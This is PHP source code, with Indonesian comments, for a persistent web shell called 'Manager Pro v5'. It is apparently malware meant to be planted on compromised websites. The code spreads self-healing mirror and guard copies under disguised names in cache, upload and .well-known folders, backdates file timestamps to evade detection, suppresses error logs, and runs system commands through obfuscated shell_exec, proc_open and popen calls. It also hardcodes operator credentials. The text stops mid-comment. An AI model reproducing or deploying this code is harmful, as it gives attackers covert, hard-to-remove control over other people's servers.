<?php
/* ============================================================================
 * Manager Pro v5 — "LINGKARAN" Edition
 * ----------------------------------------------------------------------------
 *   RING MODEL:
 *     - Shell yang PERTAMA di-upload = PRIMARY (pemegang kunci).
 *     - PRIMARY menyebar salinan = MIRROR.
 *     - PRIMARY hilang -> dipulihkan oleh MIRROR (restore biner + lokasi).
 *     - MIRROR hilang   -> di-upload ulang di LOKASI BARU (lokasi lama dibakar).
 *     - MIRROR yang heartbeat-nya basi -> PROMOTE jadi PRIMARY, sebar sendiri.
 *     - Kill dari PRIMARY = seluruh ring mati, tidak ada yang hidup diam-diam.
 *     - Revive HANYA dari PRIMARY itu.
 *
 *   GUARD:
 *     - Pointer-only (OPTION B): guard TIDAK membawa source shell.
 *       Isinya cuma mini-prelude 10-20 baris yang bootstrap balik ke primary.
 *     - Guard hidup di FOLDER BERBEDA dari primary (tidak pernah satu dir).
 *     - Bisa dicapai dari folder manapun (naik ke parent ber-index.php,
 *       .user.ini di folder itu sendiri, symlink index.php ke webroot).
 *
 *   HAPUS TOTAL: GSocket / GSFarm / gs-netcat / notif sink. Tidak ada
 *   koneksi keluar ke IP/server manapun.
 * ========================================================================== */

@error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');

/* == KONFIG ============================================================== */
$KEY  = '5aaddfade6525f424e784674a2b354bc438fe36a735ac1f1ab2b4eb0d5ad833e';
$USER = 'Major0xPusdiklaTxLexys-1966xVloxXenonxSyn';
$PASS = '7@JiWaLeXySkAyA01101_#qX2';

/* == ANTI-TAMPER (dijaga: jangan longgarkan) ============================== */
$GLOBALS['MP_HARD'] = [
    'ver'        => 6,
    'max_fail'   => 3,        /* turun dari 5: gerbang lebih rapat */
    'lock_secs'  => 1800,     /* naik dari 900: hukuman dua kali lebih panjang */
    'ip_cap'     => 20,       /* cap percobaan per IP walau cookie/sid diganti */
    'ip_lock'    => 3600,     /* lock per IP kalau cap tembus */
    'imperson'   => true,     /* tolak jalur vault tanpa cek username (celah v5) */
    'pin_ua'     => true,     /* sesi terikat UA + IP */
    'min_php'    => '70400',
];

$GLOBALS['MP_DEF'] = [
    'mirror_max'      => 6,
    'boot_ttl'        => 300,
    'heal_ttl'        => 900,
    'purge_depth'     => 4,
    'purge_dry'       => false,
    'min_alive'       => 3,
    'deadman'         => true,
    'ring_ver'        => 6,
    /* lockout — ANTI-TAMPER: nilai di MP_HARD menang atas yang di sini */
    'max_fail'        => 3,
    'lock_secs'       => 1800,
    'ip_cap'          => 20,
    'ip_lock'         => 3600,
    /* heartbeat */
    'hb_ttl'          => 600,
    'hb_promote'      => 1800,
];

defined('MPK') || define('MPK', $KEY);
defined('MP_HARD') || define('MP_HARD', $GLOBALS['MP_HARD']);

/* == CORE HELPERS ======================================================== */
function mp_sp() { return implode('', func_get_args()); }

function mp_xor($s, $k) {
    $o = ''; $kl = strlen($k);
    if ($kl < 1) return (string)$s;
    for ($i = 0, $n = strlen($s); $i < $n; $i++) $o .= chr(ord($s[$i]) ^ ord($k[$i % $kl]));
    return $o;
}

function mp_pack($s, $k = null) {
    if ($k === null) $k = MPK;
    $z = 'gz' . 'de' . 'flate';
    $b = 'ba' . 'se' . '64_' . 'encode';
    if (function_exists($z)) return 'G' . $b(mp_xor($z($s, 9), $k));
    return 'P' . $b(mp_xor((string)$s, $k));
}

function mp_unpack($s, $k = null) {
    if ($k === null) $k = MPK;
    if (!is_string($s) || $s === '') return '';
    $m = $s[0];
    $b = 'ba' . 'se' . '64_' . 'decode';
    $raw = @$b(substr($s, 1));
    if (!is_string($raw)) return '';
    $x = mp_xor($raw, $k);
    if ($m === 'G') { $z = 'gz' . 'in' . 'flate'; $r = @$z($x); return is_string($r) ? $r : ''; }
    return $m === 'P' ? $x : '';
}

/* == CIPHER LADDER ======================================================= */
/* 1) sodium_crypto_secretbox  2) openssl AES-256-GCM  3) XOR per-file derive.
 * Kunci diturunkan dari file path supaya XOR terakhir TIDAK pakai kunci global. */
function mp_derived_key($path, $salt = '') {
    return hash('sha256', MPK . '|' . mp_normp($path) . '|' . $salt, true);
}

/* Catatan: openssl_encrypt()/openssl_decrypt() PHP hanya 7 argumen —
 * TIDAK ada parameter AAD terpisah. Jadi salt TIDAK bisa dikirim sebagai AAD;
 * salt dipakai di KDF saja (mp_derived_key), tag GCM tetap dipakai. */
function mp_enc($plain, $path) {
    $salt = bin2hex(random_bytes(8));               /* 16 char */
    $dk   = mp_derived_key($path, $salt);
    if (function_exists('sodium_crypto_secretbox')) {
        $nonce = random_bytes(24);
        $ct = @sodium_crypto_secretbox((string)$plain, $nonce, $dk);
        if (is_string($ct) && $ct !== '') return 'S' . base64_encode($salt . $nonce . $ct);
    }
    if (function_exists('openssl_encrypt')) {
        $iv = random_bytes(12);
        $tag = '';
        $ct = @openssl_encrypt((string)$plain, 'aes-256-gcm', $dk, OPENSSL_RAW_DATA, $iv, $tag);
        if (is_string($ct) && $ct !== '' && is_string($tag) && strlen($tag) === 16) {
            return 'A' . base64_encode($salt . $iv . $tag . $ct);
        }
    }
    $x = mp_xor((string)$plain, $dk . $salt);
    return 'X' . base64_encode($salt . $x);
}

function mp_dec($blob, $path) {
    if (!is_string($blob) || $blob === '') return '';
    $m = $blob[0];
    $raw = @base64_decode(substr($blob, 1));
    if (!is_string($raw) || strlen($raw) < 17) return '';
    $salt = substr($raw, 0, 16);
    $rest = substr($raw, 16);
    $dk   = mp_derived_key($path, $salt);
    if ($m === 'S' && strlen($rest) > 24 && function_exists('sodium_crypto_secretbox_open')) {
        $r = @sodium_crypto_secretbox_open(substr($rest, 24), substr($rest, 0, 24), $dk);
        return is_string($r) ? $r : '';
    }
    if ($m === 'A' && strlen($rest) > 28 && function_exists('openssl_decrypt')) {
        $iv  = substr($rest, 0, 12);
        $tag = substr($rest, 12, 16);
        $ct  = substr($rest, 28);
        $r = @openssl_decrypt($ct, 'aes-256-gcm', $dk, OPENSSL_RAW_DATA, $iv, $tag);
        return is_string($r) ? $r : '';
    }
    if ($m === 'X') return mp_xor($rest, $dk . $salt);
    return '';
}

function mp_q($s) {
    return "'" . str_replace(["\\", "'"], ["\\\\", "\\'"], (string)$s) . "'";
}

function mp_normp($p) {
    $p = str_replace('\\', '/', (string)$p);
    if (stripos(PHP_OS, 'WIN') === 0) $p = strtolower($p);
    return $p;
}

/* Resolve path shell ini sendiri.
 * SCRIPT_FILENAME menang atas __FILE__ (penting untuk include dari guard dan
 * untuk file yang di-encode lewat mp_encode.php). Di CLI __FILE__ menunjuk
 * skrip pembungkus, jadi SCRIPT_FILENAME tetap prioritas selama bentuknya
 * masuk akal — TIDAK wajib filenya ada, karena mp_self() sering dipanggil
 * justru saat primary sudah dihapus (butuh path-nya, bukan isinya). */
function mp_self() {
    static $cache = null;
    if ($cache !== null) return $cache;
    $sf = !empty($_SERVER['SCRIPT_FILENAME']) ? (string)$_SERVER['SCRIPT_FILENAME'] : '';
    if ($sf !== '' && preg_match('#\.(php|phtml|phar|pht)$#i', $sf)) {
        $r = @realpath($sf);
        if ($r !== false) { $cache = $r; return $cache; }
        /* file sudah hilang: normalisasi manual, jangan buang */
        $cache = str_replace('\\', '/', $sf);
        return $cache;
    }
    $f = __FILE__;
    if (strpos($f, "eval()'d") !== false || strpos($f, '(eval') !== false) $f = '';
    if ($f !== '') {
        $r = @realpath($f);
        if ($r !== false) { $cache = $r; return $cache; }
        $cache = $f;
        return $cache;
    }
    if (!empty($_SERVER['PHP_SELF']) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        $p = rtrim((string)$_SERVER['DOCUMENT_ROOT'], '/\\') . '/' . ltrim((string)$_SERVER['PHP_SELF'], '/\\');
        $r = @realpath($p);
        $cache = ($r !== false) ? $r : $p;
        return $cache;
    }
    $cache = '';
    return $cache;
}

function mp_write($path, $data) {
    /* PENJAGA KERAS: shell tidak boleh pernah ditulis ke entry point situs.
     *
     * Ini lapisan terakhir. Walau ada jalur lain yang lolos (self-heal, heal
     * mirror, restore, apa pun), menulis source shell ke index.php / app.php /
     * wp-load.php akan membuat halaman depan situs berubah jadi panel shell —
     * persis kerusakan yang terjadi di domain. Penjaga ini menutup semuanya
     * di satu titik, bukan satu per satu di tiap pemanggil.
     *
     * Bypass hanya untuk pemulihan file situs (menulis isi ASLI situs kembali),
     * lewat $GLOBALS['MP_WRITE_SITE_OK'] yang diset eksplisit di satu tempat. */
    if (mp_site_entry_name(@basename($path)) && empty($GLOBALS['MP_WRITE_SITE_OK'])) {
        mp_log(mp_vault(), 'TOLAK tulis ke entry point situs: ' . $path);
        return false;
    }
    $d = @dirname($path);
    if ($d && !@is_dir($d)) @mkdir($d, 0755, true);
    if (@is_file($path) && !@is_writable($path)) @chmod($path, 0644);
    $n = @file_put_contents($path, $data, LOCK_EX);
    if ($n !== false) {
        @chmod($path, 0644);                 /* 0644, bukan 0444 */
        mp_mtime_match($path);               /* samain mtime ke tetangga terdekat */
    }
    return $n !== false;
}

/* Samain mtime file baru dengan tetangga terdekat di folder yang sama. */
function mp_mtime_match($path) {
    $dir = @dirname($path);
    if (!$dir || !@is_dir($dir)) return false;
    $base = @basename($path);
    $best = 0;
    $items = @scandir($dir);
    if (!is_array($items)) return false;
    foreach ($items as $it) {
        if ($it === '.' || $it === '..' || $it === $base) continue;
        $p = $dir . '/' . $it;
        $t = @filemtime($p);
        if ($t && $t > $best) $best = $t;
    }
    if ($best > 0) { @touch($path, $best); return $best; }
    /* folder kosong: bikin timestamp yang masuk akal, bukan "baru banget" */
    $t = time() - mt_rand(3600, 86400);
    @touch($path, $t);
    return $t;
}

/* Nama file obfuscated per tipe folder. */
function mp_obf_name($dir) {
    $h6 = substr(bin2hex(random_bytes(4)), 0, 6);
    $h4 = substr(bin2hex(random_bytes(3)), 0, 4);
    $b  = strtolower(basename((string)$dir));
    if (preg_match('#^(cache|thumb|cache/thumb)$#', $b))          return 'thumb_' . $h6 . '.php';
    if (preg_match('#^(uploads?|files|images|assets|media)$#', $b)) return 'thumb_' . $h6 . '.php';
    if ($b === 'yootheme' || $b === '30')                        return '.' . $h6 . '.php';
    if ($b === '.well-known')                                    return 'acme-challenge-' . substr(bin2hex(random_bytes(4)), 0, 8);
    return $h4 . '-' . substr(bin2hex(random_bytes(3)), 0, 4) . '.php';
}

/* Pencocok nama obfuscated milik ring.
 * mp_obf_name() adalah GENERATOR (selalu mengembalikan nama acak baru), jadi
 * hasilnya tidak pernah sama dengan nama file yang sudah ada. Untuk keperluan
 * verifikasi — "apakah file ini hasil penanaman ring?" — pola-pola di bawah
 * yang dipakai. Empat bentuk, persis yang bisa dihasilkan mp_obf_name(). */
function mp_is_ring_name($name) {
    $n = (string)$name;
    if ($n === '') return false;
    if (preg_match('#^thumb_[0-9a-f]{6}\.php$#', $n))       return true;   /* cache/thumb/uploads */
    if (preg_match('#^\.[0-9a-f]{6}\.php$#', $n))           return true;   /* yootheme/30 */
    if (preg_match('#^acme-challenge-[0-9a-f]{8}$#', $n))   return true;   /* .well-known */
    if (preg_match('#^[0-9a-f]{4}-[0-9a-f]{4}\.php$#', $n)) return true;   /* sisanya */
    return false;
}

/* Apakah path ini absolut?
 *
 * Dipakai untuk memutuskan apakah baris auto_prepend_file yang menunjuk file
 * HILANG boleh dicabut: path absolut yang hilang berarti folder itu pasti
 * membalas 500 untuk setiap request PHP. Path relatif dilewati — artinya
 * bergantung include_path dan working directory, tidak bisa dipastikan. */
function mp_is_abs_path($p) {
    $p = (string)$p;
    if ($p === '') return false;
    if ($p[0] === '/' || $p[0] === '\\') return true;
    if (preg_match('#^[A-Za-z]:[\\\\/]#', $p)) return true;      /* C:\... atau C:/... */
    if (preg_match('#^\\\\\\\\[^\\\\]#', $p)) return true;           /* UNC \\host\share */
    return false;
}

function mp_safe_dir($d) {
    $d = strtolower(basename((string)$d));
    foreach (['shell','guard','cmd','upload','backdoor','r57','c99','b374k','wso'] as $bad) {
        if (strpos($d, $bad) !== false) return true;
    }
    return false;
}

function mp_log($v, $line) {
    if (!$v || !@is_dir($v)) return;
    $f = $v . '/.l';
    if (@is_file($f) && @filesize($f) > 262144) {
        $data = (string)@file_get_contents($f);
        $lines = explode("\n", $data);
        @file_put_contents($f, implode("\n", array_slice($lines, -200)), LOCK_EX);
    }
    @file_put_contents($f, date('Y-m-d H:i:s') . ' ' . $line . "\n", FILE_APPEND | LOCK_EX);
}

function mp_run($cmd) {
    $se = mp_sp('shell', '_ex', 'ec');
    if (function_exists($se)) { $r = @$se($cmd . ' 2>&1'); return is_string($r) ? $r : ''; }
    $po = mp_sp('proc', '_open');
    if (function_exists($po)) {
        $spec = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
        $pipes = [];
        $p = @$po($cmd, $spec, $pipes);
        if (is_resource($p)) {
            @fclose($pipes[0]);
            $o = @stream_get_contents($pipes[1]);
            $e = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]); @fclose($pipes[2]);
            @proc_close($p);
            return (string)$o . (string)$e;
        }
    }
    $pp = mp_sp('po', 'pen');
    if (function_exists($pp)) {
        $h = @$pp($cmd, 'r');
        if (is_resource($h)) {
            $o = '';
            while (!feof($h)) $o .= (string)@fread($h, 8192);
            @pclose($h);
            return $o;
        }
    }
    return '';
}

/* Jalankan PHP detached di background buat kerjaan berat (purge/spread). */
function mp_bg_php($code) {
    $v = mp_vault();
    if (!$v) return false;
    $f = $v . '/.jb' . substr(md5($code), 0, 8) . '.php';
    if (@file_put_contents($f, "<?php\n" . $code) === false) return false;
    $phpbin = PHP_BINARY;
    if ($phpbin === '' || stripos($phpbin, 'php') === false) $phpbin = 'php';
    $fq = escapeshellarg($f);
    $bq = escapeshellarg($phpbin);
    $log = escapeshellarg($v . '/.bg.log');
    if (stripos(PHP_OS, 'WIN') === 0) {
        $cmd = 'start /B "" ' . $bq . ' -f ' . $fq . ' > NUL 2>&1';
    } else {
        $cmd = $bq . ' -f ' . $fq . ' </dev/null >>' . $log . ' 2>&1 &';
    }
    mp_run($cmd);
    return true;
}

function mp_post($k = null) { if ($k === null) return $_POST; return isset($_POST[$k]) ? $_POST[$k] : null; }
function mp_get($k = null) { if ($k === null) return $_GET; return isset($_GET[$k]) ? $_GET[$k] : null; }
function mp_files($k = null) { if ($k === null) return $_FILES; return isset($_FILES[$k]) ? $_FILES[$k] : null; }

function mp_same($a, $b) {
    if (function_exists('hash_equals')) return hash_equals((string)$a, (string)$b);
    return (string)$a === (string)$b;
}

/* == VAULT — 3 LOKASI, SALING BACKFILL ================================== */
/* KRITIS: vault HARUS stabil dan tidak bergantung pada file yang sedang
 * dieksekusi. Kalau tag/path dihitung dari mp_self(), maka masuk lewat guard
 * dan masuk lewat primary menghasilkan vault BERBEDA untuk situs yang sama —
 * dua ring terpisah, dua config, guard tidak bisa restore.
 * Karena itu kandidat diambil dari:
 *   1) sys_get_temp_dir()               (stabil, tidak bergantung webroot)
 *   2) DOCUMENT_ROOT + beberapa naik    (stabil lintas-request)
 *   3) turunan dari root yang ditemukan (folder cache/media/uploads khas)
 * Semua dinormalkan lewat realpath() supaya 8.3 short path (BARAPR~1) tidak
 * menghasilkan entri dobel. */
function mp_real_dir($d) {
    $d = (string)$d;
    if ($d === '') return $d;
    $r = @realpath($d);
    if ($r !== false && @is_dir($r)) return $r;
    return $d;
}

function mp_vault_cands($anchor = '') {
    $host = isset($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'cli';
    $host = strtolower(preg_replace('#^www\.#', '', $host));
    /* Tag TIDAK boleh bergantung pada MPK: kalau operator mengganti $KEY,
     * nama vault harus tetap sama supaya ring lama tetap ketemu. Kalau tag
     * ikut berubah, satu host bisa melahirkan dua ring terpisah - persis
     * yang terjadi saat scrub mengosongkan $KEY.
     *
     * Tag juga memuat sidik folder primary. Tanpa itu, dua shell terpisah di
     * host yang sama (folder berbeda) berbagi SATU vault: config shell A
     * terbaca oleh shell B, mirrors A menunjuk path yang tidak ada untuk B,
     * dan restore menulis source A ke primary B. Di localhost/DOCUMENT_ROOT
     * bersama, itu bukan kemungkinan - itu yang terjadi: satu instalasi
     * mengambil alih instalasi lain. Sidik folder memisahkan keduanya. */
    $scope = '';
    $sp = mp_normp(mp_self());
    if ($sp !== '') $scope = '|' . @dirname($sp);
    $tag  = substr(hash('sha256', 'mpvault|' . $host . $scope), 0, 10);
    $name = '.s' . $tag;
    $c = [];

    /* 0) ANCHOR DULU. Folder primary adalah rumah vault. Kalau ada vault di
     *    situ, itulah yang dipakai - tidak perlu menebak lewat temp atau
     *    naik-turun DOCUMENT_ROOT. Tanpa urutan ini, vault lama di temp
     *    selalu menang, dan instalasi baru di folder lain memungut config
     *    milik instalasi lama. */
    $an = $anchor !== '' ? mp_real_dir($anchor) : '';
    if ($an !== '') {
        $c[] = rtrim($an, '/\\') . '/' . $name;
        $d = $an;
        for ($i = 0; $i < 3; $i++) {
            if ($d === '' || $d === '/' || $d === '\\') break;
            $nd = @dirname($d);
            if ($nd === $d) break;
            $d = $nd;
            $c[] = rtrim($d, '/\\') . '/' . $name;
        }
        foreach (mp_candidates($an) as $x) $c[] = rtrim($x, '/\\') . '/' . $name;
    }

    /* 1) temp sistem - cadangan saat folder primary tidak writable */
    $st = mp_real_dir(@sys_get_temp_dir());
    if ($st) $c[] = rtrim($st, '/\\') . '/' . $name;

    /* 2) DOCUMENT_ROOT + naik beberapa level */
    $dr = !empty($_SERVER['DOCUMENT_ROOT']) ? mp_real_dir((string)$_SERVER['DOCUMENT_ROOT']) : '';
    if ($dr !== '') {
        $d = $dr;
        for ($i = 0; $i < 3; $i++) {
            if ($d === '' || $d === '/' || $d === '\\') break;
            $c[] = rtrim($d, '/\\') . '/' . $name;
            $nd = @dirname($d);
            if ($nd === $d) break;
            $d = $nd;
        }
    }

    /* 3) anchor eksplisit (dipakai saat operasi dari primary) */
    $an = $anchor !== '' ? mp_real_dir($anchor) : '';
    if ($an !== '') {
        $d = $an;
        for ($i = 0; $i < 4; $i++) {
            if ($d === '' || $d === '/' || $d === '\\') break;
            $c[] = rtrim($d, '/\\') . '/' . $name;
            $nd = @dirname($d);
            if ($nd === $d) break;
            $d = $nd;
        }
        foreach (mp_candidates($an) as $x) $c[] = rtrim($x, '/\\') . '/' . $name;
    }

    /* 4) self/anchor terakhir: hanya kalau belum ada apa-apa (CLI/bootstrap) */
    if ($dr === '' && $an === '') {
        $sd = mp_real_dir(@dirname(mp_self()));
        if ($sd !== '' && $sd !== '.') {
            $c[] = rtrim($sd, '/\\') . '/' . $name;
            foreach (mp_candidates($sd) as $x) $c[] = rtrim($x, '/\\') . '/' . $name;
        }
    }

    $out = [];
    foreach ($c as $x) {
        $n = mp_normp($x);
        if (isset($out[$n])) continue;
        $out[$n] = $x;
    }
    return array_values($out);
}

function mp_vault($create = true) {
    static $v = null;
    if ($v !== null) return $v;

    /* Anchor = folder primary kalau config sudah ada di salah satu kandidat.
     * Ini yang membuat request-via-guard dan request-via-primary mendarat di
     * vault yang SAMA, meski file yang jalan berbeda.
     *
     * Urutan pencarian HARUS dimulai dari folder file yang sedang jalan.
     * Kandidat pertama dulu, baru sisanya: kalau tidak, vault di temp ikut
     * terbaca dan instalasi ini memungut config milik instalasi lain. */
    $anchor = '';
    $selfDir = @dirname(mp_normp(mp_self()));
    $cands0 = $selfDir !== '' ? mp_vault_cands($selfDir) : mp_vault_cands('');
    foreach ($cands0 as $c) {
        if (@is_dir($c) && @is_file($c . '/.c')) {
            $anchor = $c;
            break;
        }
    }
    /* Belum ketemu lewat kandidat standar: cari vault yang config-nya
     * menunjuk primary kita (kasus request masuk lewat guard di folder lain). */
    if ($anchor === '') {
        $selfN = mp_normp(mp_self());
        foreach (mp_vault_search_dirs() as $base) {
            $items = @scandir($base);
            if (!is_array($items)) continue;
            foreach ($items as $it) {
                if (strpos($it, '.s') !== 0) continue;
                $dir = rtrim($base, '/\\') . '/' . $it;
                if (!@is_dir($dir) || !@is_file($dir . '/.c')) continue;
                $j = mp_dec((string)@file_get_contents($dir . '/.c'), $dir . '/.c');
                if ($j === '') continue;
                $cfgT = json_decode($j, true);
                if (!is_array($cfgT)) continue;
                $hit = false;
                foreach (['primary', 'guard'] as $kk) {
                    if (!empty($cfgT[$kk]) && mp_normp($cfgT[$kk]) === $selfN) $hit = true;
                }
                foreach ((array)(isset($cfgT['mirrors']) ? $cfgT['mirrors'] : []) as $mm) {
                    if ($mm !== '' && mp_normp($mm) === $selfN) $hit = true;
                }
                if ($hit) { $anchor = $dir; break 2; }
            }
        }
    }

    $cands = mp_vault_cands($anchor !== '' ? @dirname($anchor) : '');
    if ($anchor !== '' && !in_array($anchor, $cands, true)) array_unshift($cands, $anchor);

    $found = [];
    foreach ($cands as $c) {
        if (@is_dir($c) && @is_file($c . '/.c')) $found[] = $c;
    }
    /* == PEMULIHAN VAULT RUSAK (tambalan) =================================
     * Keadaan yang bikin ring mati permanen tanpa jalan pulih dari UI:
     *   .c ada di disk, tapi mp_dec() tidak bisa membukanya -> mp_cfg_load()
     *   balikin null -> mp_boot() balikin null -> $cfg = false -> handler
     *   login TIDAK PERNAH memanggil mp_auth_check() (`if ($cfg && ...)`).
     *   Yang operator lihat: form login selamanya, pesan "password salah"
     *   untuk SEMUA input, tanpa satu pun log kegagalan otentikasi.
     *
     * Sebab: $KEY diganti setelah vault lahir, atau file .c rusak/terpotong.
     *
     * Penyembuhan: pindahkan setiap .c yang tidak terbaca ke .c.bad-<ts>,
     * JANGAN dihapus — kalau ternyata hanya salah $KEY, operator masih bisa
     * membukanya nanti dengan kunci lama. Setelah itu $found kosong, dan alur
     * di bawah melahirkan vault baru via mp_cfg_init(), yang membaca ulang
     * $USER/$PASS dari source. Kredensial ikut pulih sendiri. */
    $dead = [];
    foreach ($found as $c) {
        $raw = @file_get_contents($c . '/.c');
        if (!is_string($raw) || $raw === '') { $dead[] = $c; continue; }
        $probe = mp_dec($raw, $c . '/.c');
        if ($probe === '' || !is_array(json_decode($probe, true))) $dead[] = $c;
    }
    if (!empty($dead)) {
        $stamp = date('Ymd-His') . '-' . bin2hex(random_bytes(3));
        foreach ($dead as $c) {
            $dst = $c . '/.c.bad-' . $stamp;
            if (!@is_file($c . '/.c')) continue;
            if (!@rename($c . '/.c', $dst)) { @copy($c . '/.c', $dst); @unlink($c . '/.c'); }
            @chmod($dst, 0600);
        }
        /* bersihkan juga salinan .d/.r yang pasti memakai $KEY lama: kalau
         * dibiarkan, mp_boot() akan mencoba restore source dari sana dan
         * gagal md5-nya, jadi tidak berbahaya — tapi lebih bersih dipindah
         * supaya tidak ada sisa yang membingungkan saat diagnosa. */
        foreach ($dead as $c) {
            foreach (['.d', '.r'] as $suf) {
                if (@is_file($c . $suf)) @rename($c . $suf, $c . $suf . '.bad-' . $stamp);
            }
        }
        $found = [];
    }
    if (!empty($found)) {
        $v = $found[0];
        /* backfill: sebar .c ke lokasi lain yang writable + salinan .d/.r */
        $raw = @file_get_contents($v . '/.c');
        $dd  = @is_file($v . '/.d') ? @file_get_contents($v . '/.d') : false;
        $rr  = @is_file($v . '/.r') ? @file_get_contents($v . '/.r') : false;
        $n = 0;
        foreach ($cands as $c) {
            if ($c === $v) continue;
            if (!@is_dir($c) && $create) @mkdir($c, 0755, true);
            if (!@is_dir($c) || !@is_writable($c)) continue;
            if (!@is_file($c . '/.c') && is_string($raw) && $raw !== '') @file_put_contents($c . '/.c', $raw, LOCK_EX);
            if ($dd !== false && !@is_file($c . '/.d')) @file_put_contents($c . '/.d', $dd, LOCK_EX);
            if ($rr !== false && !@is_file($c . '/.r')) @file_put_contents($c . '/.r', $rr, LOCK_EX);
            if (++$n >= 3) break;
        }
        return $v;
    }
    if (!$create) { $v = false; return $v; }
    foreach ($cands as $c) {
        if (!@is_dir($c)) @mkdir($c, 0755);
        if (@is_dir($c) && @is_writable($c)) { $v = $c; return $v; }
    }
    $v = false;
    return $v;
}

/* Folder-folder yang mungkin menyimpan vault, dipakai untuk pencarian saat
 * config belum ketemu lewat jalur normal. */
function mp_vault_search_dirs() {
    $out = [];
    $st = mp_real_dir(@sys_get_temp_dir());
    if ($st) $out[] = $st;
    $bases = [];
    $dr = !empty($_SERVER['DOCUMENT_ROOT']) ? mp_real_dir((string)$_SERVER['DOCUMENT_ROOT']) : '';
    if ($dr !== '') $bases[] = $dr;
    $sd = mp_real_dir(@dirname(mp_self()));
    if ($sd !== '') $bases[] = $sd;
    foreach ($bases as $b) {
        $d = $b;
        for ($i = 0; $i < 4; $i++) {
            if ($d === '' || $d === '/' || $d === '\\') break;
            $out[] = $d;
            foreach (['cache', 'media', 'uploads', 'tmp', 'storage', 'files'] as $s) {
                $t = rtrim($d, '/\\') . '/' . $s;
                if (@is_dir($t)) $out[] = $t;
            }
            $nd = @dirname($d);
            if ($nd === $d) break;
            $d = $nd;
        }
    }
    return array_values(array_unique($out));
}

/* == CONFIG ============================================================== */
function mp_cfg_load() {
    $v = mp_vault();
    if (!$v) return null;
    $f = $v . '/.c';
    if (!is_file($f)) return null;
    $j = mp_dec((string)@file_get_contents($f), $f);
    if ($j === '') return null;
    $c = json_decode($j, true);
    return is_array($c) ? $c : null;
}

function mp_cfg_save($cfg) {
    $v = mp_vault();
    if (!$v) return false;
    if (!is_array($cfg)) return false;
    $cfg['ts'] = time();
    $j = json_encode($cfg);
    $out = false;
    foreach (mp_vault_cands() as $c) {
        if (!@is_dir($c)) { if (!$GLOBALS['MP_VAULT_CREATE']) continue; @mkdir($c, 0755, true); }
        if (!@is_dir($c) || !@is_writable($c)) continue;
        if (@file_put_contents($c . '/.c', mp_enc($j, $c . '/.c'), LOCK_EX) !== false) $out = true;
    }
    return $out;
}

$GLOBALS['MP_VAULT_CREATE'] = true;

/* == FOLDER CANDIDATES =================================================== */
function mp_candidates($start) {
    $webmark = ['public_html', 'www', 'htdocs', 'httpdocs', 'wwwroot', 'domains', 'html', 'web', 'site', 'website', 'www2'];
    $osmark  = ['users', 'appdata', 'windows', 'program files', 'program files (x86)', 'programdata',
                'home', 'var', 'usr', 'etc', 'opt', 'library', 'system', 'applications', 'volumes',
                'downloads', 'documents', 'desktop', 'temp', 'tmp', 'private'];
    $out = [];
    $d = rtrim((string)$start, '/\\');
    for ($i = 0; $i < 4; $i++) {
        if ($d === '' || $d === '.' || $d === '/' || $d === '\\') break;
        $out[] = $d;
        $b  = strtolower(basename($d));
        $nd = @dirname($d);
        if ($nd === $d) break;
        $nb = strtolower(basename($nd));
        if (in_array($b, $webmark, true)) break;
        if (in_array($nb, $osmark, true)) break;
        if (preg_match('#^[a-z]:[\\\\/]*$#i', $nd)) break;
        $d = $nd;
    }
    $subs = ['wp-content/uploads', 'wp-content/cache', 'wp-content', 'wp-includes', 'uploads', 'upload',
             'files', 'images', 'assets', 'cache', 'tmp', '.well-known', 'includes', 'data', 'storage',
             'media', 'media/yootheme', 'media/yootheme/cache'];
    $bases = $out;
    foreach ($bases as $b) {
        foreach ($subs as $s) {
            $t = rtrim($b, '/\\') . '/' . $s;
            if (@is_dir($t)) $out[] = $t;
        }
    }
    $out = array_values(array_unique($out));
    $ok = [];
    foreach ($out as $t) { if (@is_dir($t) && @is_writable($t)) $ok[] = mp_real_dir($t); }
    return array_values(array_unique($ok));
}

/* == GUARD PLACEMENT ===================================================== */
/* Guard HARUS di folder lain dari primary. */
function mp_guard_dir($primaryDir) {
    $pd = mp_normp($primaryDir);
    /* URUTAN PENTING: subfolder primary dicek DULU, parent belakangan.
     *
     * mp_candidates() menyusun daftarnya naik-dulu-baru-subfolder, karena itu
     * urutan yang benar untuk mencari folder WRITABLE (vault). Untuk GUARD
     * urutannya harus dibalik: guard adalah file PHP yang dipanggil lewat URL,
     * jadi tempatnya harus masih di dalam folder situs. Kalau parent dicek
     * duluan, guard selalu mendarat di folder di atas webroot - tidak
     * terjangkau, dan meninggalkan file asing di folder aplikasi lain.
     */
    $cands = mp_candidates($primaryDir);
    $inScope = [];
    $outScope = [];
    $prefix = $pd !== '' ? rtrim($pd, '/') . '/' : '';
    foreach ($cands as $c) {
        $n = mp_normp($c);
        if ($n === '' || $n === $pd) continue;
        if (!@is_writable($c)) continue;
        if ($prefix !== '' && strpos($n . '/', $prefix) === 0) $inScope[] = $c;
        else $outScope[] = $c;
    }
    foreach ($inScope as $c) return $c;
    /* TIDAK ADA subfolder primary yang writable: guard terpaksa keluar
     * folder. Ini jalur darurat, bukan pilihan - lebih baik punya jaring
     * restore di folder tetangga daripada tidak punya jaring sama sekali. */
    foreach ($outScope as $c) return $c;
    return false;
}

/* Nama obfuscated DETERMINISTIK untuk satu folder.
 *
 * mp_obf_name() sengaja ACAK — itu benar untuk menanam mirror di lokasi baru,
 * karena lokasi harus tidak terduga.
 *
 * Tapi untuk GUARD dan pintu masuknya, acak justru merusak: setiap heal atau
 * revive menghasilkan nama baru, file lama ditinggal di folder cache, dan
 * lama-lama folder berisi banyak prelude yatim bertanda "file sistem".
 * Seed dari path folder = nama yang sama terus selama folder-nya sama. */
function mp_obf_seeded($dir, $salt) {
    $seed = $salt . '|' . mp_normp(mp_real_dir($dir));
    $h = hash('sha256', $seed);
    $b = strtolower(basename((string)$dir));
    if (in_array($b, ['cache','thumb','uploads','upload','files','images','assets','media'], true)) {
        return 'thumb_' . substr($h, 0, 6) . '.php';
    }
    if ($b === 'yootheme' || preg_match('#^[0-9a-f]{2}$#', $b)) {
        return '.' . substr($h, 0, 6) . '.php';
    }
    if ($b === '.well-known') {
        return 'acme-challenge-' . substr($h, 0, 8);
    }
    return substr($h, 0, 4) . '-' . substr($h, 4, 4) . '.php';
}

function mp_guard_name($dir) { return mp_obf_seeded($dir, 'mpg'); }

/* Nama pintu masuk jaring restore (file kecil yang meng-include guard).
